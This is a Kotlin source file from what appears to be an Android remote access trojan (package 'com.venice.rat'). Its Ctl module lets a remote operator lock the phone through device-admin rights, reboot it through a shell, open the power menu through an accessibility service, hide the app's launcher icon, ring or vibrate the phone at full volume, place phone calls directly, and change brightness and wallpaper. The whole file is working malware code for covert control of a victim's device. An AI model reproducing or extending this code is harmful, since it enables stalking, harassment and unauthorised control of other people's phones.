package com.venice.rat.mod

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.widget.Toast
import com.venice.rat.core.Shell
import com.venice.rat.core.U

object Ctl {

    private var player: MediaPlayer? = null

    fun toast(ctx: Context, msg: String) {
        Handler(Looper.getMainLooper()).post { Toast.makeText(ctx, msg, Toast.LENGTH_LONG).show() }
    }

    fun vibrate(ctx: Context, ms: Long) {
        val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (Build.VERSION.SDK_INT >= 26)
            v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
        else @Suppress("DEPRECATION") v.vibrate(ms)
    }

    fun ring(ctx: Context, secs: Int): Boolean = runCatching {
        stopRing()
        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
        player = MediaPlayer().apply {
            setDataSource(ctx, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE))
            isLooping = true
            prepare()
            start()
        }
        Handler(Looper.getMainLooper()).postDelayed({ stopRing() }, secs * 1000L)
        true
    }.getOrDefault(false)

    fun stopRing() {
        runCatching { player?.stop(); player?.release() }
        player = null
    }

    fun adminComp(ctx: Context) = ComponentName(ctx, AdminRcv::class.java)

    fun isAdmin(ctx: Context): Boolean = runCatching {
        (ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager).isAdminActive(adminComp(ctx))
    }.getOrDefault(false)

    fun askAdmin(ctx: Context) {
        runCatching {
            ctx.startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp(ctx))
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        }
    }

    fun lock(ctx: Context): Boolean = runCatching {
        if (!isAdmin(ctx)) return false
        (ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager).lockNow()
        true
    }.getOrDefault(false)

    fun power(ctx: Context, reboot: Boolean): String {
        if (reboot) {
            val out = Shell.run("reboot")
            if (!out.contains("ERR")) return "reboot bheja"
        }
        val ok = KeySvc.inst?.performGlobalAction(
            android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_POWER_DIALOG) == true
        return if (ok) "power menu khola" else "accessibility on karo"
    }

    fun brightness(ctx: Context, pct: Int): Boolean = runCatching {
        Settings.System.putInt(ctx.contentResolver, Settings.System.SCREEN_BRIGHTNESS,
            pct.coerceIn(0, 100) * 255 / 100)
        true
    }.getOrDefault(false)

    fun hide(ctx: Context, on: Boolean) {
        ctx.packageManager.setComponentEnabledSetting(
            ComponentName(ctx, com.venice.rat.MainActivity::class.java),
            if (on) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            android.content.pm.PackageManager.DONT_KILL_APP)
    }

    fun screenOn(ctx: Context) {
        runCatching {
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            @Suppress("DEPRECATION")
            val w = pm.newWakeLock(android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP, "v:wake")
            w.acquire(8000)
        }
    }

    fun dial(ctx: Context, num: String, direct: Boolean) {
        runCatching {
            val i = Intent(if (direct) Intent.ACTION_CALL else Intent.ACTION_DIAL,
                android.net.Uri.parse("tel:$num"))
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
        }
    }

    fun wall(ctx: Context, f: java.io.File): Boolean = runCatching {
        ctx.startActivity(Intent(Intent.ACTION_ATTACH_DATA).apply {
            setDataAndType(U.uri(ctx, f), "image/*")
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_ACTIVITY_NEW_TASK)
        })
        true
    }.getOrDefault(false)
}
